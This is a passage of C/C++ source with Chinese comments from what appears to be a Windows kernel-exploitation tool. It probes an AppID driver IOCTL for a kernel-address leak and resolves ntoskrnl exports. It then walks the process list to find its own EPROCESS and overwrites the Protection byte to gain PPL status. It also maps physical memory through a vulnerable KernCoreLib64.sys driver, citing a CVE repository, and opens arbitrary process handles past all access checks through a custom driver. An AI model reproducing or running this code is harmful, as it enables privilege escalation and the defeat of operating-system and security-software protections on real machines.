            g_appid.section_handle, g_appid.user_mapping, size);
    return true;
}

// 探测 SrpDevice IOCTL — 尝试多种输入格式和大小
static bool appid_probe_ioctl() {
    if (!g_pp.device || g_pp.device == INVALID_HANDLE_VALUE) return false;

    // SrpVerifyDll 的调用签名 (从 AipDeviceIoControlDispatch 逆向):
    //   SrpVerifyDll(SystemBuffer, OutputBufLen, SystemBuffer, InputBufLen, r14, RequestorMode)
    // r14 = IRP+0x38 (UserBuffer 或 Information 指针)
    // 输入格式未知 — 系统性探测不同大小

    // 尝试的输入大小列表 (AppID IOCTL 常见大小)
    static const DWORD try_sizes[] = {
        0x08, 0x10, 0x14, 0x18, 0x1C, 0x20, 0x24, 0x28, 0x2C,
        0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70,
        0x80, 0x100, 0x200, 0x400
    };

    log_msg("appid: 系统探测 IOCTL 0x%X 输入大小 (%d 种)",
            APPID_VERIFY_IOCTL, (int)(sizeof(try_sizes)/sizeof(try_sizes[0])));

    for (int i = 0; i < (int)(sizeof(try_sizes)/sizeof(try_sizes[0])); i++) {
        DWORD inSize = try_sizes[i];
        // 清零输入, 填入可能的路径
        memset(g_appid.ioctl_in_buf, 0, sizeof(g_appid.ioctl_in_buf));
        // 尝试: 前4字节=flags=1, 8字节后=WCHAR路径
        if (inSize >= 0x10) {
            *(unsigned int*)(g_appid.ioctl_in_buf + 0) = 1;
            const wchar_t* dllPath = L"C:\\Windows\\System32\\kernel32.dll";
            size_t copyLen = (inSize - 8) / sizeof(wchar_t);
            wcsncpy((wchar_t*)(g_appid.ioctl_in_buf + 8),
                    dllPath, copyLen - 1);
        }
        // 也尝试不同输出大小
        for (DWORD outSize = 0; outSize <= 0x200; outSize += (outSize < 0x20 ? 8 : 0x40)) {
            DWORD ret = 0;
            BOOL ok = DeviceIoControl(g_pp.device, APPID_VERIFY_IOCTL,
                                      g_appid.ioctl_in_buf, inSize,
                                      g_appid.ioctl_out_buf,
                                      outSize > 0 ? outSize : sizeof(g_appid.ioctl_out_buf),
                                      &ret, nullptr);
            DWORD err = ok ? 0 : GetLastError();
            if (err != 87) { // 87 = INVALID_PARAMETER — 跳过
                log_msg("  ⚠️ inSize=0x%X outSize=0x%X → ok=%d ret=%lu err=%lu",
                        inSize, outSize, ok, ret, err);
                if (ok && ret > 0) {
                    // 检查输出中的内核地址
                    for (DWORD j = 0; j + 8 <= ret && j < 64; j += 8) {
                        unsigned long long v = *(unsigned long long*)(g_appid.ioctl_out_buf + j);
                        log_msg("    out[%lu] = 0x%llx", j, v);
                        if ((v >> 48) == 0xFFFF && v != 0xFFFFFFFFFFFFFFFFULL) {
                            log_msg("    ⚠️ kernel address! g_appid.kernel_mapping_base = 0x%llx", v);
                            g_appid.kernel_mapping_base = v;
                            return true;
                        }
                    }
                }
            }
            if (outSize == 0) break; // 只试 outSize=0 一次
        }
    }
    return false;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 3. 找 ntoskrnl 基址 + 解析内核导出 ───────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

// 通过 NtQuerySystemInformation(SystemModuleInformation) 找 ntoskrnl 内核基址
static bool find_ntoskrnl_base() {
    if (!pNtQuerySystemInformation) return false;
    ULONG len = 0;
    pNtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &len);
    if (!len) { log_msg("NtQuerySystemInformation len=0"); return false; }
    void* buf = malloc(len + 0x1000);
    if (!buf) return false;
    LONG status = pNtQuerySystemInformation(SystemModuleInformation, buf, len + 0x1000, &len);
    if (status < 0) {
        log_msg("NtQuerySystemInformation failed status=0x%lx (need SeDebugPrivilege?)", status);
        free(buf);
        return false;
    }
    RTL_PROCESS_MODULES* mods = (RTL_PROCESS_MODULES*)buf;
    bool found = false;
    for (ULONG i = 0; i < mods->NumberOfModules; i++) {
        const char* name = (const char*)mods->Modules[i].FullPathName
                         + mods->Modules[i].OffsetToFileName;
        if (_stricmp(name, "ntoskrnl.exe") == 0) {
            g_pp.ntoskrnl_base = (unsigned long long)mods->Modules[i].ImageBase;
            log_msg("ntoskrnl.exe kernel base = 0x%llx", g_pp.ntoskrnl_base);
            found = true;
            break;
        }
    }
    free(buf);
    return found;
}

// 通过 LoadLibraryEx(磁盘上 ntoskrnl.exe, DONT_RESOLVE) 解析导出 RVA,
// 再加内核基址得到内核地址。
// 返回: kernel_addr = kernel_base + (user_addr - user_load_base)
static unsigned long long resolve_kernel_export(const char* name) {
    // ntoskrnl.exe 在 System32
    char path[MAX_PATH];
    if (!GetSystemDirectoryA(path, MAX_PATH)) return 0;
    strcat_s(path, MAX_PATH, "\\ntoskrnl.exe");
    HMODULE h = LoadLibraryExA(path, nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!h) {
        log_msg("LoadLibraryEx(%s) failed err=%lu", path, GetLastError());
        return 0;
    }
    FARPROC p = GetProcAddress(h, name);
    unsigned long long rva = p ? ((unsigned long long)(intptr_t)p
                                  - (unsigned long long)(intptr_t)h) : 0;
    FreeLibrary(h);
    if (!rva) {
        log_msg("export '%s' not found in ntoskrnl.exe", name);
        return 0;
    }
    unsigned long long kaddr = g_pp.ntoskrnl_base + rva;
    log_msg("export %s: user RVA=0x%llx → kernel addr=0x%llx", name, rva, kaddr);
    return kaddr;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 4. 动态偏移解析 (从内核函数字节签名) ──────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

// PsGetProcessProtection: 8A 81 <off32> C3 → mov al, [rcx+off32]; ret
static bool extract_protection_offset() {
    unsigned long long fn = resolve_kernel_export("PsGetProcessProtection");
    if (!fn) return false;
    unsigned char bytes[8] = {0};
    for (int i = 0; i < 7; i++) {
        if (!kread1(fn + i, &bytes[i])) {
            log_msg("kread1 PsGetProcessProtection+%d failed", i);
            return false;
        }
    }
    // 预期: 8A 81 xx xx xx xx C3
    if (bytes[0] != 0x8A || bytes[1] != 0x81 || bytes[6] != 0xC3) {
        log_msg("PsGetProcessProtection signature mismatch: "
                "%02x %02x %02x %02x %02x %02x %02x",
                bytes[0], bytes[1], bytes[2], bytes[3],
                bytes[4], bytes[5], bytes[6]);
        // 尝试备用: 有时是 0F B6 81 (movzx eax, [rcx+disp32])
        if (bytes[0] == 0x0F && bytes[1] == 0xB6 && bytes[2] == 0x81) {
            unsigned int off = *(unsigned int*)(bytes + 3);
            g_pp.protection_offset = off;
            log_msg("Protection offset = 0x%X (movzx variant)", off);
            return true;
        }
        return false;
    }
    unsigned int off = *(unsigned int*)(bytes + 2);
    g_pp.protection_offset = off;
    log_msg("Protection offset = 0x%X (from PsGetProcessProtection bytes)", off);
    return true;
}

// PsGetProcessId: 48 8B 81 <off32> C3 → mov rax, [rcx+off32]; ret
static bool extract_unique_pid_offset() {
    unsigned long long fn = resolve_kernel_export("PsGetProcessId");
    if (!fn) return false;
    unsigned char bytes[9] = {0};
    for (int i = 0; i < 8; i++) {
        if (!kread1(fn + i, &bytes[i])) return false;
    }
    // 预期: 48 8B 81 xx xx xx xx C3
    if (bytes[0] != 0x48 || bytes[1] != 0x8B || bytes[2] != 0x81 || bytes[7] != 0xC3) {
        log_msg("PsGetProcessId signature mismatch: "
                "%02x %02x %02x %02x %02x %02x %02x %02x",
                bytes[0], bytes[1], bytes[2], bytes[3],
                bytes[4], bytes[5], bytes[6], bytes[7]);
        return false;
    }
    unsigned int off = *(unsigned int*)(bytes + 3);
    g_pp.unique_pid_offset = off;
    g_pp.active_links_offset = off + 8; // LIST_ENTRY 紧跟在 8字节 HANDLE 后
    log_msg("UniqueProcessId offset = 0x%X, ActiveProcessLinks = 0x%X",
            off, g_pp.active_links_offset);
    return true;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 5. 找本进程 EPROCESS (走 ActiveProcessLinks 链表) ───────────────────
// ═══════════════════════════════════════════════════════════════════════

static bool find_our_eprocess() {
    // PsInitialSystemProcess 是内核中一个指针变量, 指向 System EPROCESS (PID=4)
    unsigned long long psInitAddr = resolve_kernel_export("PsInitialSystemProcess");
    if (!psInitAddr) return false;
    g_pp.ps_initial_system_process = psInitAddr;

    unsigned long long systemEproc = 0;
    if (!kread8(psInitAddr, &systemEproc) || !systemEproc) {
        log_msg("read PsInitialSystemProcess failed");
        return false;
    }
    log_msg("System EPROCESS = 0x%llx", systemEproc);

    // ActiveProcessLinks.Flink 在 systemEproc + active_links_offset
    // Flink 指向下一个 EPROCESS 的 ActiveProcessLinks (不是 EPROCESS 本身!)
    // 所以 next_eproc = flink - active_links_offset
    unsigned long long myPid = (unsigned long long)GetCurrentProcessId();
    unsigned long long head = systemEproc + g_pp.active_links_offset;
    unsigned long long cur = head;
    int safety = 0;
    do {
        unsigned long long flink = 0;
        if (!kread8(cur, &flink) || !flink) {
            log_msg("read Flink at 0x%llx failed", cur);
            return false;
        }
        unsigned long long nextEproc = flink - g_pp.active_links_offset;
        // 读这个 EPROCESS 的 PID
        unsigned long long pid = 0;
        if (!kread8(nextEproc + g_pp.unique_pid_offset, &pid)) {
            log_msg("read PID at 0x%llx failed", nextEproc);
            return false;
        }
        if (pid == myPid) {
            g_pp.our_eprocess = nextEproc;
            log_msg("FOUND our EPROCESS = 0x%llx (PID=%llu)",
                    nextEproc, pid);
            return true;
        }
        cur = flink;
    } while (cur != head && ++safety < 65536);

    log_msg("EPROCESS not found in list after %d entries", safety);
    return false;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 6. Patch Protection + 验证 ──────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

static bool patch_protection(unsigned char targetPpl) {
    unsigned long long addr = g_pp.our_eprocess + g_pp.protection_offset;
    // 先读当前值
    unsigned char cur = 0;
    if (!kread1(addr, &cur)) return false;
    log_msg("current EPROCESS.Protection = 0x%02x @ 0x%llx", cur, addr);

    if (!kwrite1(addr, targetPpl)) return false;
    log_msg("wrote 0x%02x to EPROCESS.Protection @ 0x%llx", targetPpl, addr);

    // 读回验证
    unsigned char now = 0;
    if (!kread1(addr, &now)) return false;
    if (now != targetPpl) {
        log_msg("VERIFY FAILED: wrote 0x%02x but read back 0x%02x", targetPpl, now);
        return false;
    }
    g_pp.current_protection = now;
    log_msg("VERIFY OK: EPROCESS.Protection = 0x%02x", now);
    return true;
}

// 通过 NtQueryInformationProcess(ProcessProtectionInformation) 验证
static int query_protection_via_nt() {
    if (!pNtQueryInformationProcess) return -1;
    unsigned char val = 0;
    ULONG ret = 0;
    LONG st = pNtQueryInformationProcess(GetCurrentProcess(),
                                        ProcessProtectionInformation,
                                        &val, sizeof(val), &ret);
    if (st < 0) {
        log_msg("NtQueryInformationProcess(Protection) status=0x%lx", st);
        return -1;
    }
    log_msg("NtQueryInformationProcess(Protection) = 0x%02x", val);
    return val;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 7. KernCoreLib64.sys 物理内存路径 ──────────────────────────────────
//   与第 3~6 节的"内核虚拟 R/W"链并列。KernCoreLib64.sys 只提供物理内存映射,
//   无法直接读内核虚拟地址, 故不走 NtQuerySystemInformation+ntoskrnl 导出链,
//   而是映射物理内存 → 扫描定位本进程 EPROCESS → 直接写 Protection 字节。
//   参考: github.com/readmsr/MSI_FeatureManager_CVE phys_mem.cpp
// ═══════════════════════════════════════════════════════════════════════

// 7a. I/O 端口 R/W (经 IOCTL 0x80102050/54)。PCI 配置空间访问是标准配置周期,
//     始终完成, 绝不挂起总线 (只有设备 MMIO 读会挂起)。
static bool kc_io_read32(unsigned short port, unsigned int* out) {
    KcPortReadReq r; r.port = port; r.pad0 = 0; r.pad1 = 0; r.size = 4;
    unsigned int v = 0; DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, IOCTL_READ_IO_PORT, &r, sizeof(r),
                         &v, sizeof(v), &ret, NULL) || ret < sizeof(v))
        return false;
    *out = v; return true;
}
static bool kc_io_write32(unsigned short port, unsigned int val) {
    KcPortWriteReq w; w.port = port; w.value = val; w.size = 4;
    DWORD ret = 0;
    return DeviceIoControl(g_pp.device, IOCTL_WRITE_IO_PORT, &w, sizeof(w),
                           nullptr, 0, &ret, NULL) != FALSE;
}

// PCI 配置空间 dword 读/写 (0xCF8 地址口 / 0xCFC 数据口)
static unsigned int kc_pci_read32(int bus, int dev, int func, int off) {
    unsigned int addr = 0x80000000u | ((unsigned int)(bus & 0xFF) << 16)
                      | ((unsigned int)(dev & 0x1F) << 11)
                      | ((unsigned int)(func & 7) << 8)
                      | (unsigned int)(off & 0xFC);
    kc_io_write32(0xCF8, addr);
    unsigned int v = 0xFFFFFFFFu; kc_io_read32(0xCFC, &v);
    return v;
}
static void kc_pci_write32(int bus, int dev, int func, int off, unsigned int val) {
    unsigned int addr = 0x80000000u | ((unsigned int)(bus & 0xFF) << 16)
                      | ((unsigned int)(dev & 0x1F) << 11)
                      | ((unsigned int)(func & 7) << 8)
                      | (unsigned int)(off & 0xFC);
    kc_io_write32(0xCF8, addr);
    kc_io_write32(0xCFC, val);
}

static void kc_mmio_add(unsigned long long base, unsigned long long len) {
    if (base == 0 || len == 0 || g_kc_mmio_count >= KC_MAX_MMIO) return;
    g_kc_mmio[g_kc_mmio_count].base = base;
    g_kc_mmio[g_kc_mmio_count].len  = len;
    g_kc_mmio_count++;
}

// 7b. 经 PCI 配置空间枚举所有 memory BAR → 设备 MMIO 范围列表
//   全程仅访问 0xCF8/0xCFC (PCI 配置周期, 绝不挂起)。
//   写 0xFFFFFFFF 到 BAR 读取 size 后立即还原 (config 写不影响设备 MMIO 解码时序)。
static void kerncore_enumerate_pci_mmio() {
    g_kc_mmio_count = 0;
    // 固定低 MMIO 窗口 [0xFC000000, 4GB): BIOS/PCI/ACPI/HPET/IOAPIC 等。
    // 映射起点 0xFC000800 落在此窗口 → 必须整段跳过 (上一版卡死的根因)。
    kc_mmio_add(0xFC000000ULL, 0x100000000ULL - 0xFC000000ULL);

    int scanned = 0;
    for (int bus = 0; bus < 256; bus++) {
        for (int dev = 0; dev < 32; dev++) {
            if ((kc_pci_read32(bus, dev, 0, 0) & 0xFFFF) == 0xFFFF) continue;
            unsigned int htype = (kc_pci_read32(bus, dev, 0, 0x0C) >> 16) & 0xFF;
            int maxfunc = (htype & 0x80) ? 7 : 0;
            for (int func = 0; func <= maxfunc; func++) {
                if ((kc_pci_read32(bus, dev, func, 0) & 0xFFFF) == 0xFFFF) continue;
                scanned++;
                unsigned int h = (kc_pci_read32(bus, dev, func, 0x0C) >> 16) & 0x7F;
                int barcount = (h == 0x01) ? 2 : 6;  // PCI-PCI 桥: 2 BAR; 普通: 6
                for (int bi = 0; bi < barcount; ) {
                    int boff = 0x10 + bi * 4;
                    unsigned int bar = kc_pci_read32(bus, dev, func, boff);
                    if (bar == 0 || (bar & 1)) { bi++; continue; }  // 空 / I/O BAR
                    int type = (bar >> 1) & 3;
                    unsigned long long base = 0, size = 0;
                    unsigned int orig_lo = bar, orig_hi = 0;
                    if (type == 2) {  // 64-bit memory BAR (占两个 dword)
                        if (bi + 1 >= barcount) { bi++; continue; }
                        orig_hi = kc_pci_read32(bus, dev, func, boff + 4);
                        base = ((unsigned long long)bar & ~0xFULL)
                             | ((unsigned long long)orig_hi << 32);
                        kc_pci_write32(bus, dev, func, boff,     0xFFFFFFFFu);
                        kc_pci_write32(bus, dev, func, boff + 4, 0xFFFFFFFFu);
                        unsigned int sz_lo = kc_pci_read32(bus, dev, func, boff);
                        unsigned int sz_hi = kc_pci_read32(bus, dev, func, boff + 4);
                        kc_pci_write32(bus, dev, func, boff,     orig_lo);
                        kc_pci_write32(bus, dev, func, boff + 4, orig_hi);
                        unsigned long long sz = ((unsigned long long)sz_hi << 32)
                                              | (unsigned long long)(sz_lo & ~0xFu);
                        if (sz) size = sz & (~sz + 1ULL);   // 最低置位 = BAR 大小 (32/64位通用)
                        bi += 2;
                    } else if (type == 0) {  // 32-bit memory BAR
                        base = bar & ~0xFULL;
                        kc_pci_write32(bus, dev, func, boff, 0xFFFFFFFFu);
                        unsigned int sz_lo = kc_pci_read32(bus, dev, func, boff);
                        kc_pci_write32(bus, dev, func, boff, orig_lo);
                        unsigned long long sz = (unsigned long long)(sz_lo & ~0xFu);
                        if (sz) size = sz & (~sz + 1ULL);   // 最低置位 = BAR 大小 (32/64位通用)
                        bi += 1;
                    } else {  // 1=废弃 1MB BAR / 3=保留
                        bi += 1; continue;
                    }
                    if (base && size) {
                        kc_mmio_add(base, size);
                        log_msg("kerncore: PCI MMIO b%dd%df%d base=0x%llx len=0x%llx",
                                bus, dev, func, base, size);
                    }
                }
            }
        }
    }
    log_msg("kerncore: PCI 扫描 %d 功能, 收集 %d 个 MMIO 范围 (含低窗口)",
            scanned, g_kc_mmio_count);
}

// 7c. 由 MMIO 范围推算可安全扫描的 RAM 范围 ([4GB, RAM_top) 减去 MMIO)
//   仅扫描这些范围 → 只读 RAM → 绝不读设备 MMIO → 不会卡死。
static int qsort_cmp_mmio(const void* a, const void* b) {
    unsigned long long xa = ((const KernCoreMmioRange*)a)->base;
    unsigned long long xb = ((const KernCoreMmioRange*)b)->base;
    return (xa < xb) ? -1 : (xa > xb ? 1 : 0);
}
static void kerncore_compute_ram_ranges(unsigned long long ram_top) {
    g_kc_ram_count = 0;
    qsort(g_kc_mmio, g_kc_mmio_count, sizeof(KernCoreMmioRange), qsort_cmp_mmio);
    unsigned long long cur = 0x100000000ULL;  // 4GB — 低窗口 [0xFC000800,4GB) 全跳过
    if (cur < KERNCORE_PHYS_BASE) cur = KERNCORE_PHYS_BASE;
    for (int i = 0; i < g_kc_mmio_count; i++) {
        unsigned long long mb = g_kc_mmio[i].base;
        unsigned long long me = mb + g_kc_mmio[i].len;
        if (me <= cur) continue;            // 该 MMIO 全在已跳过范围之前
        if (mb > cur && cur < ram_top && g_kc_ram_count < KC_MAX_RAM_RANGES) {
            unsigned long long rb = cur;
            unsigned long long re = (mb < ram_top) ? mb : ram_top;
            if (re > rb) {
                g_kc_ram[g_kc_ram_count].base = rb;
                g_kc_ram[g_kc_ram_count].len  = re - rb;
                g_kc_ram_count++;
            }
        }
        if (me > cur) cur = me;
    }
    if (cur < ram_top && g_kc_ram_count < KC_MAX_RAM_RANGES) {
        g_kc_ram[g_kc_ram_count].base = cur;
        g_kc_ram[g_kc_ram_count].len  = ram_top - cur;
        g_kc_ram_count++;
    }
    unsigned long long total = 0;
    for (int i = 0; i < g_kc_ram_count; i++) total += g_kc_ram[i].len;
    log_msg("kerncore: 推算 %d 段可扫描 RAM, 合计 0x%llx 字节 (≈%llu MB)",
            g_kc_ram_count, total, total >> 20);
}

// 7d. 单次映射 [0xFC000800, RAM) (驱动 bound 要求起点=0xFC000800; size 无校验)
//   映射只创建 PTE, 不读物理页 → 安全。危险仅在"读"MMIO VA, 由 7e 只扫 RAM 规避。
static bool kerncore_map_physical() {
    ULONGLONG ram_kb = 0;
    unsigned long long ram = 8ULL * 1024 * 1024 * 1024;
    if (GetPhysicallyInstalledSystemMemory(&ram_kb) && ram_kb > 0) ram = ram_kb * 1024;
    if (ram <= KERNCORE_PHYS_BASE) {
        log_msg("kerncore: RAM 0x%llx <= 基址 0x%llx", ram, (unsigned long long)KERNCORE_PHYS_BASE);
        return false;
    }
    unsigned long long sz = ram - KERNCORE_PHYS_BASE;
    KernCoreMapRequest req; memset(&req, 0, sizeof(req));
    req.size = sz; req.phys_addr = KERNCORE_PHYS_BASE;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, IOCTL_MAP_PHYS_MEM, &req, sizeof(req),
                         &req, sizeof(req), &ret, NULL) || !req.section_base_va) {
        log_msg("kerncore: IOCTL_MAP_PHYS_MEM 失败 err=%lu", GetLastError());
        return false;
    }
    g_kc.map_base_va = (void*)(ULONG_PTR)req.section_base_va;
    g_kc.map_size    = sz;
    log_msg("kerncore: 物理内存已映射 base_va=%p size=0x%llx ([0x%llx, 0x%llx))",
            g_kc.map_base_va, sz, (unsigned long long)KERNCORE_PHYS_BASE,
            (unsigned long long)KERNCORE_PHYS_BASE + sz);
    return true;
}

// 7e. 仅在可扫描 RAM 范围内扫描本进程 EPROCESS (只读 RAM → 绝不读 MMIO → 不会卡死)
//   返回: 1=找到, 0=未找到, -2=无映射/无范围 (拒绝)
//   注意: 仅用 POD 局部变量, 兼容 /EHsc 下的 __try/__except (C2712)
static int kerncore_find_eprocess_safe() {
    if (!g_kc.map_base_va || g_kc_ram_count <= 0) {
        log_msg("kerncore: 未映射或无可扫描 RAM 范围 — 拒绝扫描");
        return -2;
    }
    if (getenv("TZD_KC_DRYRUN")) {
        log_msg("kerncore: TZD_KC_DRYRUN=1 — 跳过扫描 (仅验证枚举/推算/映射)");
        for (int i = 0; i < g_kc_ram_count; i++)
            log_msg("  RAM[%d] [0x%llx, 0x%llx) len=0x%llx", i,
                    g_kc_ram[i].base, g_kc_ram[i].base + g_kc_ram[i].len, g_kc_ram[i].len);
        return 0;  // 不扫描, 视为"未找到"以便检查输出
    }

    wchar_t wpath[MAX_PATH];
    DWORD plen = GetModuleFileNameW(NULL, wpath, MAX_PATH);
    char our_name[16]; memset(our_name, 0, sizeof(our_name));
    if (plen) {
        int base_idx = 0;
        for (int i = (int)plen - 1; i >= 0; i--) {
            if (wpath[i] == L'\\' || wpath[i] == L'/') { base_idx = i + 1; break; }
        }
        for (int i = 0; i < 15 && base_idx + i < (int)plen; i++) {
            wchar_t c = wpath[base_idx + i];
            if (c == 0) break;
            if (c >= L'A' && c <= L'Z') c = c - L'A' + L'a';
            our_name[i] = (c >= 32 && c <= 126) ? (char)c : '.';
        }
    }
    unsigned long long my_pid = (unsigned long long)GetCurrentProcessId();
    unsigned char* mb = (unsigned char*)g_kc.map_base_va;
    unsigned long long mb_phys = KERNCORE_PHYS_BASE;
    int found = 0;
    // 诊断计数: 确认映射确实读到了数据 (非全部 __except 跳过)
    unsigned long long reads = 0, skipped = 0, sys_seen = 0;

    for (int ri = 0; ri < g_kc_ram_count && !found; ri++) {
        unsigned long long rb = g_kc_ram[ri].base;
        unsigned long long rl = g_kc_ram[ri].len;
        if (rl < 8 || rb < mb_phys) continue;
        unsigned char* p = mb + (rb - mb_phys);
        for (unsigned long long o = 0; o + 8 <= rl; o += 8) {
            unsigned long long cv = (unsigned long long)(p + o);
            unsigned long long val = 0;
            __try { val = *(volatile unsigned long long*)cv; reads++; }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                skipped++; o = (o & ~0xFFFULL) + 0x1000 - 8; continue;
            }
            // 同时探测 System 进程 (PID=4): 若在高位 RAM 命中, 证明映射可读且 System 在高位
            if (val == 4 && !sys_seen) {
                unsigned long long ep = cv - KC_UNIQUEPID_OFFSET;
                unsigned long long fl = 0;
                __try { fl = *(volatile unsigned long long*)(ep + KC_ACTIVELINKS_OFFSET); }
                __except (EXCEPTION_EXECUTE_HANDLER) { fl = 0; }
                if ((fl & KC_FLINK_KERNEL_HI) == KC_FLINK_KERNEL_HI) {
                    sys_seen = 1;
                    log_msg("kerncore: 诊断 — System(PID=4) EPROCESS 候选 @ map_va=0x%llx phys=0x%llx "
                            "(映射可读, System 在高位 RAM)", ep, rb + o - KC_UNIQUEPID_OFFSET);
                }
            }
            if (val != my_pid) continue;

            unsigned long long ep = cv - KC_UNIQUEPID_OFFSET;
            unsigned long long flink = 0, ctime = 0, dir_base = 0;
            __try {
                flink    = *(volatile unsigned long long*)(ep + KC_ACTIVELINKS_OFFSET);
                ctime    = *(volatile unsigned long long*)(ep + KC_CREATETIME_OFFSET);
                dir_base = *(volatile unsigned long long*)(ep + KC_DIRECTORYBASE_OFFSET);
            } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
            if ((flink & KC_FLINK_KERNEL_HI) != KC_FLINK_KERNEL_HI) continue;
            if (ctime < KC_TS_MIN || ctime > KC_TS_MAX) continue;
            if (dir_base == 0 || (dir_base & 0xFFF) != 0 ||
                (dir_base & KC_FLINK_KERNEL_HI) != KC_FLINK_KERNEL_HI) continue;

            char nm[16]; memset(nm, 0, sizeof(nm));
            bool name_ok = true;
            __try {
                for (int i = 0; i < 15; i++) {
                    char c = *(volatile char*)(ep + KC_IMAGEFILENAME_OFFSET + (unsigned long long)i);
                    nm[i] = (c >= 32 && c <= 126) ? c : (c == 0 ? 0 : '.');
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { name_ok = false; }
            if (!name_ok) continue;
            bool match = true;
            for (int i = 0; i < 15; i++) {
                char a = nm[i], b = our_name[i];
                if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
                if (a != b) { match = false; break; }
                if (a == 0) break;
            }
            if (!match) {
                log_msg("kerncore: PID命中但名字不符 found=\"%.15s\" want=\"%s\" — 继续",
                        nm, our_name);
                continue;
            }

            g_kc.eproc_map_va = ep;
            g_kc.eproc_phys   = rb + o - KC_UNIQUEPID_OFFSET;
            log_msg("kerncore: 找到本进程 EPROCESS map_va=0x%llx phys=0x%llx name=\"%.15s\"",
                    g_kc.eproc_map_va, g_kc.eproc_phys, nm);
            g_pp.our_eprocess        = ep;
            g_pp.protection_offset  = KC_PROTECTION_OFFSET;
            g_pp.unique_pid_offset   = (unsigned int)KC_UNIQUEPID_OFFSET;
            g_pp.active_links_offset = (unsigned int)KC_ACTIVELINKS_OFFSET;
            found = 1;
            break;
        }
    }
    if (!found) {
        log_msg("kerncore: 已扫描全部可扫描 RAM, 未找到本进程 EPROCESS (PID=%llu)", my_pid);
        log_msg("  诊断: reads=%llu skipped=%llu System候选=%llu", reads, skipped, sys_seen);
        if (reads > 0 && sys_seen) {
            log_msg("  → 映射可读 (读到真实数据), System 在高位 RAM, 但本进程 EPROCESS 不在高位");
            log_msg("    → 本进程 EPROCESS 在低位 RAM (<4GB), 此驱动只能映射 [~4GB, RAM), 无法到达 → KernCoreLib64 在本机无法定位");
        } else if (reads == 0) {
            log_msg("  → 映射可能未提交页 (reads=0), 全部被 __except 跳过 — 映射异常");
        } else {
            log_msg("  → reads>0 但未见 System 候选; System 也在低位 RAM (或校验过严)");
        }
    }
    return found;
}

// 7c. patch EPROCESS.Protection (通过物理内存映射直接写)
static bool kerncore_patch_protection(unsigned char targetPpl) {
    if (!g_kc.eproc_map_va) return false;
    unsigned long long addr = g_kc.eproc_map_va + KC_PROTECTION_OFFSET;
    unsigned char* p = (unsigned char*)addr;

    unsigned char cur = 0;
    __try { cur = *(volatile unsigned char*)p; }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        log_msg("kerncore: 读 Protection @ 0x%llx 失败 (页错误)", addr);
        return false;
    }
    log_msg("kerncore: 当前 EPROCESS.Protection = 0x%02x @ 0x%llx", cur, addr);

    __try { *(volatile unsigned char*)p = targetPpl; }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        log_msg("kerncore: 写 Protection 0x%02x @ 0x%llx 失败 (页错误)", targetPpl, addr);
        return false;
    }
    log_msg("kerncore: 已写入 0x%02x 到 EPROCESS.Protection @ 0x%llx", targetPpl, addr);

    // 读回验证
    unsigned char now = 0;
    __try { now = *(volatile unsigned char*)p; }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        log_msg("kerncore: 读回 Protection 失败");
        return false;
    }
    if (now != targetPpl) {
        log_msg("kerncore: VERIFY FAILED 写入 0x%02x 读回 0x%02x", targetPpl, now);
        return false;
    }
    g_pp.current_protection = now;
    log_msg("kerncore: VERIFY OK EPROCESS.Protection = 0x%02x", now);
    return true;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 内核直通 API (仅 TZD_DRIVER_CUSTOM 驱动可用) ──────────────────────────
//   通过 IOCTL 直接调用驱动内核原语, 绕过用户态 ntoskrnl 导出链。
//   驱动端实现见 native/driver/tzd_ppl_drv.c
// ═══════════════════════════════════════════════════════════════════════

// 检查内核直通是否可用 (CUSTOM 驱动 + 设备已打开)
static bool kernel_ioctl_ready() {
    return g_pp.driver_type == TZD_DRIVER_CUSTOM &&
           g_pp.device && g_pp.device != INVALID_HANDLE_VALUE;
}

// 内核强制打开进程句柄 — 绕过所有安全检查 (ObOpenObjectByPointer KernelMode)
//   返回句柄 (调用者负责 CloseHandle) 或 NULL
HANDLE process_protect_kernel_open_process(unsigned long pid,
                                           unsigned int desiredAccess) {
    if (!kernel_ioctl_ready() || pid == 0) return NULL;
    CustomOpenProcReq req; memset(&req, 0, sizeof(req));
    req.pid = pid;
    req.desiredAccess = desiredAccess;
    CustomOpenProcRsp rsp; memset(&rsp, 0, sizeof(rsp));
    DWORD ret = 0;
    // METHOD_BUFFERED: input=output=同一 SystemBuffer
    //   输入: CustomOpenProcReq (8 字节)
    //   输出: CustomOpenProcRsp (12 字节, 含 HANDLE + NTSTATUS)
    //   取 output 大 = max(sizeof(req), sizeof(rsp))
    DWORD bufSize = (sizeof(req) > sizeof(rsp)) ? (DWORD)sizeof(req) : (DWORD)sizeof(rsp);
    // 用足够大的缓冲区 (rsp >= req, 但保险起见)
    unsigned char buf[32]; memset(buf, 0, sizeof(buf));
    memcpy(buf, &req, sizeof(req));
    if (!DeviceIoControl(g_pp.device, CUSTOM_OPEN_PROCESS,
                        buf, (DWORD)sizeof(req),
                        buf, sizeof(buf), &ret, nullptr)) {
        log_msg("kernel_open_process: IOCTL failed err=%lu pid=%lu", GetLastError(), pid);
        return NULL;
    }
    if (ret < sizeof(rsp)) {
        log_msg("kernel_open_process: short reply ret=%lu", ret);
        return NULL;
    }
    memcpy(&rsp, buf, sizeof(rsp));
    if (rsp.status < 0 || !rsp.handle) {
        log_msg("kernel_open_process: driver status=0x%lx pid=%lu", rsp.status, pid);
        return NULL;
    }
    log_msg("kernel_open_process: pid=%lu handle=%p (bypassed all access checks)", pid, rsp.handle);
    return rsp.handle;
}

// 按 PID 直接设置 PPL — 内核直通 (无需 ntoskrnl 导出链)
